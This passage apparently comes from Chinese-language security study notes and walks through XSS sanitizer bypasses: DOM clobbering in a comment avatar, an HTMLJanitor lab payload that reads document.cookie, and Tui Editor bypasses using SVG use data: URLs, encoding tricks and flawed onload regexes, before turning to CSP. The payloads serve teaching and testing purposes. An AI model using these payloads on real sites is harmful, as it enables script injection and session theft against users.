escapeHTML(comment.avatar) : defaultAvatar.avatar) + &#x27;&quot;</span>&gt;</span>&#x27;;</span><br><span class=\"line\"></span><br><span class=\"line\">        let divImgContainer = document.createElement(&quot;div&quot;);</span><br><span class=\"line\">        divImgContainer.innerHTML = avatarImgHTML</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">id</span>=<span class=\"string\">test1</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">id</span>=<span class=\"string\">test1</span> <span class=\"attr\">name</span>=<span class=\"string\">test2</span> <span class=\"attr\">href</span>=<span class=\"string\">&quot;&quot;</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span></span><br><span class=\"line\">返回HTMLCollection(2) [a#test1, a#test1, test1: a#test1, test2: a#test1]</span><br><span class=\"line\">通过test1取到collections中，test2取到第二个a</span><br><span class=\"line\">--&gt; window.test1.test2</span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">id</span>=<span class=\"string\">&quot;test1&quot;</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;test2&quot;</span> <span class=\"attr\">href</span>=<span class=\"string\">&quot;&quot;</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span></span><br><span class=\"line\">--&gt; node.attributes.length </span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;a id=defaultAvatar&gt;&lt;a id=defaultAvatar name=avatar href=&quot;cid:&amp;quot;onerror=alert(2)&quot;//&gt;</span><br><span class=\"line\">&lt;a id=defaultAvatar href=&quot;&quot;&gt;</span><br><span class=\"line\">&lt;a id=defaultAvatar name=avatar href=&quot;1:&amp;quot;onerror=alert(1)//&quot;&gt;</span><br></pre></td></tr></table></figure>\n<p>这里很明显我们可以用 Dom Clobbering 来控制  <code>window.defaultAvatar</code> ，只要我们原来没有头像就可以用一个构造一个 <code>defaultAvatar.avatar</code>  进行 XSS 了。</p>\n<p>触发后</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;img class=&quot;avatar&quot; src=&quot;cid:&quot; onerror=&quot;alert(1)&quot;//&quot;&quot;&gt;</span><br></pre></td></tr></table></figure>\n<p>href 中的内容需要符合 dompurify 中的协议</p>\n<p>至于为什么要用 a 标签，在 ok boomer 中有详细解释，因为 a 标签不继承 tostring 方法</p>\n<p>在 <code>&lt;a&gt;</code>  元素的情况下， <code>toString</code>  只返回一个 <code>href</code>  属性值。最终把 href 中的内容放入 img 的 src 中</p>\n<h3 id=\"labclobbering-dom-attributes-to-bypass-html-filters\"><a class=\"markdownIt-Anchor\" href=\"#labclobbering-dom-attributes-to-bypass-html-filters\">#</a> Lab:Clobbering DOM attributes to bypass HTML filters</h3>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">HTMLJanitor.prototype.clean = function (html) &#123;</span><br><span class=\"line\">const sandbox = document.implementation.createHTMLDocument(&#x27;&#x27;);</span><br><span class=\"line\">const root = sandbox.createElement(&quot;div&quot;);</span><br><span class=\"line\">root.innerHTML = html;</span><br><span class=\"line\"></span><br><span class=\"line\">this._sanitize(sandbox, root);</span><br><span class=\"line\"></span><br><span class=\"line\">return root.innerHTML;</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"title class_\">HTMLJanitor</span>.<span class=\"property\"><span class=\"keyword\">prototype</span></span>.<span class=\"property\">_sanitize</span> = <span class=\"keyword\">function</span> (<span class=\"params\"><span class=\"variable language_\">document</span>, parentNode</span>) &#123;                                                                           </span><br><span class=\"line\"><span class=\"keyword\">var</span> treeWalker = <span class=\"title function_\">createTreeWalker</span>(<span class=\"variable language_\">document</span>, parentNode);</span><br><span class=\"line\"><span class=\"keyword\">var</span> node = treeWalker.<span class=\"title function_\">firstChild</span>();</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> (!node) &#123; <span class=\"keyword\">return</span>; &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">do</span> &#123;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (node.<span class=\"property\">nodeType</span> === <span class=\"title class_\">Node</span>.<span class=\"property\">TEXT_NODE</span>) &#123;</span><br><span class=\"line\">    <span class=\"comment\">// If this text node is just whitespace and the previous or next element</span></span><br><span class=\"line\">    <span class=\"comment\">// sibling is a block element, remove it</span></span><br><span class=\"line\">    <span class=\"comment\">// N.B.: This heuristic could change. Very specific to a bug with</span></span><br><span class=\"line\">    <span class=\"comment\">// `contenteditable` in Firefox: http://jsbin.com/EyuKase/1/edit?js,output</span></span><br><span class=\"line\">    <span class=\"comment\">// <span class=\"doctag\">FIXME:</span> make this an option?</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (node.<span class=\"property\">data</span>.<span class=\"title function_\">trim</span>() === <span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\">        &amp;&amp; ((node.<span class=\"property\">previousElementSibling</span> &amp;&amp; <span class=\"title function_\">isBlockElement</span>(node.<span class=\"property\">previousElementSibling</span>))</span><br><span class=\"line\">             || (node.<span class=\"property\">nextElementSibling</span> &amp;&amp; <span class=\"title function_\">isBlockElement</span>(node.<span class=\"property\">nextElementSibling</span>)))) &#123;</span><br><span class=\"line\">      parentNode.<span class=\"title function_\">removeChild</span>(node);</span><br><span class=\"line\">      <span class=\"variable language_\">this</span>.<span class=\"title function_\">_sanitize</span>(<span class=\"variable language_\">document</span>, parentNode);</span><br><span class=\"line\">      <span class=\"keyword\">break</span>;</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">      <span class=\"keyword\">continue</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">// Remove all comments</span></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (node.<span class=\"property\">nodeType</span> === <span class=\"title class_\">Node</span>.<span class=\"property\">COMMENT_NODE</span>) &#123;</span><br><span class=\"line\">    parentNode.<span class=\"title function_\">removeChild</span>(node);</span><br><span class=\"line\">    <span class=\"variable language_\">this</span>.<span class=\"title function_\">_sanitize</span>(<span class=\"variable language_\">document</span>, parentNode);</span><br><span class=\"line\">    <span class=\"keyword\">break</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">var</span> isInline = <span class=\"title function_\">isInlineElement</span>(node);</span><br><span class=\"line\">  <span class=\"keyword\">var</span> containsBlockElement;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (isInline) &#123;</span><br><span class=\"line\">    containsBlockElement = <span class=\"title class_\">Array</span>.<span class=\"property\"><span class=\"keyword\">prototype</span></span>.<span class=\"property\">some</span>.<span class=\"title function_\">call</span>(node.<span class=\"property\">childNodes</span>, isBlockElement);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">// Block elements should not be nested (e.g. &lt;li&gt;&lt;p&gt;...); if</span></span><br><span class=\"line\">  <span class=\"comment\">// they are, we want to unwrap the inner block element.</span></span><br><span class=\"line\">  <span class=\"keyword\">var</span> isNotTopContainer = !! parentNode.<span class=\"property\">parentNode</span>;</span><br><span class=\"line\">  <span class=\"keyword\">var</span> isNestedBlockElement =</span><br><span class=\"line\">        <span class=\"title function_\">isBlockElement</span>(parentNode) &amp;&amp;</span><br><span class=\"line\">        <span class=\"title function_\">isBlockElement</span>(node) &amp;&amp;</span><br><span class=\"line\">        isNotTopContainer;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">var</span> nodeName = node.<span class=\"property\">nodeName</span>.<span class=\"title function_\">toLowerCase</span>();</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">var</span> allowedAttrs = <span class=\"title function_\">getAllowedAttrs</span>(<span class=\"variable language_\">this</span>.<span class=\"property\">config</span>, nodeName, node);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">var</span> isInvalid = isInline &amp;&amp; containsBlockElement;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">// Drop tag entirely according to the whitelist *and* if the markup</span></span><br><span class=\"line\">  <span class=\"comment\">// is invalid.</span></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (isInvalid || <span class=\"title function_\">shouldRejectNode</span>(node, allowedAttrs)</span><br><span class=\"line\">      || (!<span class=\"variable language_\">this</span>.<span class=\"property\">config</span>.<span class=\"property\">keepNestedBlockElements</span> &amp;&amp; isNestedBlockElement)) &#123;</span><br><span class=\"line\">    <span class=\"comment\">// Do not keep the inner text of SCRIPT/STYLE elements.</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (! (node.<span class=\"property\">nodeName</span> === <span class=\"string\">&#x27;SCRIPT&#x27;</span> || node.<span class=\"property\">nodeName</span> === <span class=\"string\">&#x27;STYLE&#x27;</span>)) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">while</span> (node.<span class=\"property\">childNodes</span>.<span class=\"property\">length</span> &gt; <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">        parentNode.<span class=\"title function_\">insertBefore</span>(node.<span class=\"property\">childNodes</span>[<span class=\"number\">0</span>], node);</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    parentNode.<span class=\"title function_\">removeChild</span>(node);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"variable language_\">this</span>.<span class=\"title function_\">_sanitize</span>(<span class=\"variable language_\">document</span>, parentNode);</span><br><span class=\"line\">    <span class=\"keyword\">break</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">// Sanitize attributes</span></span><br><span class=\"line\">  <span class=\"keyword\">for</span> (<span class=\"keyword\">var</span> a = <span class=\"number\">0</span>; a &lt; node.<span class=\"property\">attributes</span>.<span class=\"property\">length</span>; a += <span class=\"number\">1</span>) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> attr = node.<span class=\"property\">attributes</span>[a];</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"title function_\">shouldRejectAttr</span>(attr, allowedAttrs, node)) &#123;</span><br><span class=\"line\">      node.<span class=\"title function_\">removeAttribute</span>(attr.<span class=\"property\">name</span>);</span><br><span class=\"line\">      <span class=\"comment\">// Shift the array to continue looping.</span></span><br><span class=\"line\">      a = a - <span class=\"number\">1</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">// Sanitize children</span></span><br><span class=\"line\">  <span class=\"variable language_\">this</span>.<span class=\"title function_\">_sanitize</span>(<span class=\"variable language_\">document</span>, node);</span><br><span class=\"line\"></span><br><span class=\"line\">&#125; <span class=\"keyword\">while</span> ((node = treeWalker.<span class=\"title function_\">nextSibling</span>()));</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;form id=x tabindex=0 onfocus=alert(document.cookie)&gt;&lt;input id=attributes&gt;</span><br></pre></td></tr></table></figure>\n<h2 id=\"tui_editor\"><a class=\"markdownIt-Anchor\" href=\"#tui_editor\">#</a> Tui_editor</h2>\n<p>常见的 Markdown 渲染器对于 XSS 问题有两种处理方式：</p>\n<ul>\n<li>在渲染的时候格外注意，在写入标签和属性的时候进行实体编码</li>\n<li>渲染时不做任何处理，渲染完成以后再将整个数据作为富文本进行过滤</li>\n</ul>\n<p>相比起来，后一种方式更加安全（它的安全主要取决于富文本过滤器的安全性）。前一种方式的优势是，不会因为二次过滤导致丢失一些正常的属性，另外少了一遍处理效率肯定会更高，它的缺点是一不注意就可能出问题，另外也不支持直接在 Markdown 里插入 HTML。</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cueXVxdWUuY29tL2F0dGFjaG1lbnRzL3l1cXVlLzAvMjAyMi9tZC8yNzU5Mjg1LzE2NDM4MTQwMDM2NTItZWUzMDYwMjItZTMxMS00N2Y5LWJkYjYtYzAzOWYwN2NmMTNmLm1k\">📎Tui Editor 的 bypass 之路.md</span></p>\n<blockquote>\n<p>过滤过程是：</p>\n<ol>\n<li>先正则直接去除注释与 onload 属性的内容</li>\n<li>将上面处理后的内容，赋值给一个新创建的 div 的 innerHTML 属性，建立起一颗 DOM 树</li>\n<li>用黑名单删除掉一些危险 DOM 节点，比如 iframe、script 等</li>\n<li>用白名单对属性进行一遍处理，处理逻辑是\n<ul>\n<li>只保留白名单里名字<strong>开头</strong>的属性</li>\n<li>对于满足正则 <code>/href|src|background/i</code>  的属性，进行额外处理</li>\n</ul>\n</li>\n<li>处理完成后的 DOM，获取其 HTML 代码返回</li>\n</ol>\n</blockquote>\n<p>绕过 1：</p>\n<p>使用 SVG 的 use 标签，use 的作用是引用本页面或第三方页面的另一个 svg 元素，比如：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;svg&gt;</span><br><span class=\"line\">    &lt;circle id=&quot;myCircle&quot; cx=&quot;5&quot; cy=&quot;5&quot; r=&quot;4&quot; stroke=&quot;blue&quot;/&gt;</span><br><span class=\"line\">    &lt;use href=&quot;#myCircle&quot;&gt;&lt;/use&gt;</span><br><span class=\"line\">&lt;/svg&gt;</span><br></pre></td></tr></table></figure>\n<p>use 的 href 属性指向那个被它引用的元素。但与 a 标签的 href 属性不同的是，use href 不能使用 JavaScript 伪协议，但可以使用 data: 协议。</p>\n<p>比如：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;svg&gt;&lt;use href=&quot;data:image/svg+xml,&lt;svg id=&#x27;x&#x27; xmlns=&#x27;http://www.w3.org/2000/svg&#x27; xmlns:xlink=&#x27;http://www.w3.org/1999/xlink&#x27; width=&#x27;100&#x27; height=&#x27;100&#x27;&gt;&lt;a xlink:href=&#x27;javascript:alert(1)&#x27;&gt;&lt;rect x=&#x27;0&#x27; y=&#x27;0&#x27; width=&#x27;100&#x27; height=&#x27;100&#x27; /&gt;&lt;/a&gt;&lt;/svg&gt;#x&quot;&gt;&lt;/use&gt;&lt;/svg&gt;</span><br></pre></td></tr></table></figure>\n<p>data 协议中的文件必须是一个完整的 svg，而且整个 data URL 的末尾，需要有一个锚点 <code>#x</code>  来指向内部这个被引用的 svg。</p>\n<p>对于 XSS sanitizer 来说，这个 Payload 只有 svg、use 两个标签和 href 一个属性，但因为 use 的引用特性，所以 data 协议内部的 svg 也会被渲染出来。</p>\n<p>data 协议，base64 编码</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;svg&gt;&lt;use href=&quot;data:image/svg+xml;base64,PHN2ZyBpZD0neCcgeG1sbnM9J2h0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnJyAKICAgIHhtbG5zOnhsaW5rPSdodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hsaW5rJyB3aWR0aD0nMTAwJyBoZWlnaHQ9JzEwMCc+PGEgeGxpbms6aHJlZj0namF2YXNjcmlwdDphbGVydCgxKSc+PHJlY3QgeD0nMCcgeT0nMCcgd2lkdGg9JzEwMCcgaGVpZ2h0PScxMDAnIC8+PC9hPjwvc3ZnPg#x&quot;&gt;&lt;/use&gt;&lt;/svg&gt;</span><br></pre></td></tr></table></figure>\n<p>绕过 2：</p>\n<p>ISO-2022-JP 编码</p>\n<p>ISO-2022-JP 编码在解析的时候会忽略 <code>\\x1B\\x28\\x42</code> ，也就是 <code>%1B%28B</code> 。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;svg&gt;&lt;use href=&quot;data:image/svg+xml;charset=ISO-2022-JP,&lt;svg id=&#x27;x&#x27; xmlns=&#x27;http://www.w3.org/2000/svg&#x27; xmlns:xlink=&#x27;http://www.w3.org/1999/xlink&#x27; width=&#x27;100&#x27; height=&#x27;100&#x27;&gt;&lt;a xlink:href=&#x27;javas%1B%28Bcript:alert(1)&#x27;&gt;&lt;rect x=&#x27;0&#x27; y=&#x27;0&#x27; width=&#x27;100&#x27; height=&#x27;100&#x27; /&gt;&lt;/a&gt;&lt;/svg&gt;#x&quot;&gt;&lt;/use&gt;&lt;/svg&gt;</span><br></pre></td></tr></table></figure>\n<p>即三种方式</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">base64</span><br><span class=\"line\">Chrome ISO-<span class=\"number\">2022</span>-JP</span><br><span class=\"line\">&lt;details ontoggle=<span class=\"string\">&quot;alert(1)&quot;</span>&gt; </span><br></pre></td></tr></table></figure>\n<p>或</p>\n<p>通过条件竞争</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;svg&gt;&lt;svg onload=alert(1)&gt;</span><br><span class=\"line\">&lt;details open ontoggle=alert(1)&gt;</span><br></pre></td></tr></table></figure>\n<p>补丁绕过</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">export const TAG_NAME = &#x27;[A-Za-z][A-Za-z0-9-]*&#x27;;</span><br><span class=\"line\">const reXSSOnload = new RegExp(`(&lt;$&#123;TAG_NAME&#125;[^&gt;]*)(onload\\s*=)`, &#x27;ig&#x27;);</span><br><span class=\"line\"></span><br><span class=\"line\">export function sanitizeHTML(html: string) &#123;</span><br><span class=\"line\">    const root = document.createElement(&#x27;div&#x27;);</span><br><span class=\"line\"></span><br><span class=\"line\">    if (isString(html)) &#123;</span><br><span class=\"line\">        html = html.replace(reComment, &#x27;&#x27;).replace(reXSSOnload, &#x27;$1&#x27;);</span><br><span class=\"line\">        root.innerHTML = html;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    // ...</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>1. 贪婪模式导致绕过</p>\n<p>正则在标签名 <code>[A-Za-z][A-Za-z0-9-]*</code>  的后面，使用了 <code>[^&gt;]*</code>  来匹配非 <code>&gt;</code>  的所有字符。</p>\n<p>如果此时有两个 <code>onload=</code> ，那么这个 <code>[^&gt;]*</code>  将会匹配到第二个，而将它删除掉，而第一个 <code>onload=</code>  将被保留。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;svg&gt;&lt;svg onload=alert(1) onload=alert(2)&gt;&lt;/svg&gt;&lt;/svg&gt;</span><br></pre></td></tr></table></figure>\n<p>2. 非贪婪绕过</p>\n<p>即使改成非贪婪模式，删除掉的是第一个 <code>onload=</code> ，第二个 <code>onload=</code>  仍然会保留，所以无法解决问题，构造的 Payload 如下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;p&gt;&lt;svg&gt;&lt;svg onload=onload=alert(1)&gt;&lt;/svg&gt;&lt;/svg&gt;&lt;/p&gt;</span><br></pre></td></tr></table></figure>\n<p>正则优化：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">(&lt;[A-Za-z][A-Za-z0-9-]*\\s)([onload=]*))</span><br></pre></td></tr></table></figure>\n<p>3. 字符匹配导致问题</p>\n<p>如果这个正则匹配上 HTML 属性中的一个 <code>&gt;</code> ，则会停止向后匹配，这样 <code>onload=</code>  也能保留下来。Payload 如下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;svg&gt;&lt;svg x=&quot;&gt;&quot; onload=alert(1)&gt;</span><br></pre></td></tr></table></figure>\n<p>总结</p>\n<p>1. 用户交互型</p>\n<blockquote>\n<p>svg use 属性，base64 编码，绕过 JavaScript 关键字</p>\n<p>svg use 属性，charset=ISO-2022-jp，Chrome 忽略特定字符，导致 JavaScript 关键字消失</p>\n</blockquote>\n<p>2. 非用户交互型</p>\n<blockquote>\n<p>1. 条件竞争</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;svg&gt;&lt;svg onload&gt;</span><br><span class=\"line\">&lt;detail ontoggle=alert(1)&gt; //在黑名单删除details标签前，就已经将ontoggle事件加载进事件队列中即使删除也会执行</span><br></pre></td></tr></table></figure>\n<p>2. 绕过补丁</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1.绕过贪婪匹配</span><br><span class=\"line\">由于贪婪匹配一直会匹配到没有匹配的元素为止，利用两个onload，将会忽略第一个onlad</span><br><span class=\"line\">&lt;svg&gt;&lt;svg onload=alert(1) onload=alert(2)&gt;</span><br><span class=\"line\">2.绕过非贪婪匹配</span><br><span class=\"line\">由于非贪婪只匹配第一个元素，导致第一个onload被删除，第二个onload得以保留</span><br><span class=\"line\">&lt;p&gt;&lt;svg&gt;&lt;svg onload=onload=alert(1)&gt;&lt;/svg&gt;&lt;/svg&gt;&lt;/p&gt;</span><br><span class=\"line\">3.字符匹配</span><br><span class=\"line\">正则表达式遇到&gt;就结束</span><br><span class=\"line\">&lt;svg&gt;&lt;svg x=&quot;&gt;&quot; onload=alert(1)&gt;</span><br></pre></td></tr></table></figure>\n</blockquote>\n<h2 id=\"csp\"><a class=\"markdownIt-Anchor\" href=\"#csp\">#</a> CSP</h2>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cueXVxdWUuY29tL2F0dGFjaG1lbnRzL3l1cXVlLzAvMjAyMi9tZC8yNzU5Mjg1LzE2NDQwNDQwMjE3NTEtZDhmZmI2YTQtYzJhYi00YzRhLWE1N2YtMGQ1MDY2NDVmZWIyLm1k\">📎CSP 常规绕过思路.md</span></p>\n<p>CSP（Content Security Policy，内容安全策略），是网页应用中常见的一种安全保护机制，它实质就是白名单制度，开发者明确告诉客户端，哪些外部资源可以加载和执行，哪些不可以</p>\n<p><strong>通过响应包头（Response Header）实现：</strong></p>\n<figure class=\"highlight csp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attribute\">Content-Security-policy</span>: <span class=\"keyword\">default-src</span> <span class=\"string\">&#x27;self&#x27;</span>; <span class=\"keyword\">script-src</span> <span class=\"string\">&#x27;self&#x27;</span> allowed.com; <span class=\"keyword\">img-src</span> <span class=\"string\">&#x27;self&#x27;</span> allowed.com; <span class=\"keyword\">style-src</span> <span class=\"string\">&#x27;self&#x27;</span>;</span><br></pre></td></tr></table></figure>\n<p><strong>通过 HTML 元标签实现：</strong></p>\n<figure class=\"highlight csp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;<span class=\"keyword\">default-src</span> <span class=\"string\">&#x27;self&#x27;</span>; <span class=\"keyword\">img-src</span> https://*; <span class=\"keyword\">child-src</span> <span class=\"string\">&#x27;none&#x27;</span>;&quot;&gt;</span><br></pre></td></tr></table></figure>\n<p>除了 Content-Security-Policy，还有一个 Content-Security-Policy-Report-Only 字段，表示不执行限制选项，只是记录违反限制的行为。它必须与 report-uri 选项配合使用。</p>\n<figure class=\"highlight csp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attribute\">Content-Security-Policy-Report-Only</span>: <span class=\"keyword\">default-src</span> <span class=\"string\">&#x27;self&#x27;</span>; ...; <span class=\"keyword\">report-uri</span> /my_amazing_csp_report_parser;</span><br></pre></td></tr></table></figure>\n<h3 id=\"csp指令值\"><a class=\"markdownIt-Anchor\" href=\"#csp指令值\">#</a> CSP 指令值</h3>\n<p>介绍完 CSP 的指令，下面介绍一下指令值，即允许或不允许的资源</p>\n<blockquote>\n<ul>\n<li>*： 星号表示允许任何 URL 资源，没有限制；</li>\n<li>self： 表示仅允许来自同源（相同协议、相同域名、相同端口）的资源被页面加载；</li>\n<li>data：仅允许数据模式（如 Base64 编码的图片）方式加载资源；</li>\n<li>none：不允许任何资源被加载；</li>\n<li>unsafe-inline：允许使用内联资源，例如内联 <code>&lt;script&gt;</code>  标签，内联事件处理器，内联 <code>&lt;style&gt;</code>  标签等，但出于安全考虑，不建议使用；</li>\n<li>nonce：通过使用一次性加密字符来定义可以执行的内联 js 